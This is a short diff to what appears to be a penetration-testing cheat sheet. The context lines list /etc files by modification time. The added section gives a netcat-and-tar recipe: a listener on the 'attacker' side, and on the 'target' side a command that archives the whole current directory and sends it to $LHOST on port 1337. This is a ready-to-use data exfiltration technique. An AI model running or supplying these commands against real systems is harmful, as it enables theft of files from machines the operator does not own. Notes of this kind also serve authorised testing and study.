@@ -82,3 +82,12 @@ full iso time can be sorted alphabetically, so pipe to sort to sort the results.
 find /etc/ -type f -printf "%T+ %p\n" 2>/dev/null | grep -v 0000000000
 find /etc/ -type f -printf "%T+ %p\n" 2>/dev/null | grep -v 0000000000 | sort
 ```
+
+# copy entire directory to attacker machine quickly by piping tar
+attacker
+```bash
+## attacker
+nc -lvnp 1337 | tar -xf -
+## target
+tar -cf - . | nc $LHOST 1337
+```
